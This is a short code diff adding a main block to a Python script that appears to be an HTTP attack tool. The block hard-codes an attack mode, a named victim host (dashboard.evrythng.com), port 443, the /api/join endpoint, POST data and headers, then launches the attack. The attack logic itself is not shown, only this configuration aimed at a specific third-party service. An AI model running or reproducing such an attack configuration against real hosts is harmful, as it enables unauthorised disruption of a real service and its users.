@@ -525,3 +525,21 @@ def options():
     print(args)
     # debug
     main(args)
+
+
+if __name__ == "__main__":
+    parser = build_parser()
+    args = parser.parse_args()
+    args.attack = 2
+    args.victim = "dashboard.evrythng.com"
+    args.webPort = 443
+    args.uri = "/api/join"
+    args.httpMethod = "POST"
+    args.https = "ON"
+    args.verb = "ON"
+    args.postData = "o,1,ac,1,firstName,lastName,nothing322,isTermsAccepted,true"
+    args.requestHeaders = "Content-Type,application/json"
+    print(args)
+    # debug
+    main(args)
+
